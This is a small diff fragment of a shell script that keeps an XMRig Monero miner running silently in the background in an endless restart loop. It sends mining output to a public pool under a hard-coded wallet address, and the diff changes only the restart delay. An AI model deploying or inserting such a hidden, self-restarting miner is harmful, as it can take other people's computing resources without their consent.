@@ -17,6 +17,6 @@
   # XMRig'i yeniden başlatma döngüsü (sessiz ve arka planda)
   while true; do
     ./xmrig -o pool.supportxmr.com:3333 -u 88NXbHvPdph8KkXhSbou43iLmbo7MrpBp6nycitmj2rCR1tkfN2kEAcHMiHd2zZMgy7VtRj6T5p4dDhNMB2UzwHwPiiSHcN -p x -B
-    sleep 5
+    sleep 30
   done
 ) &
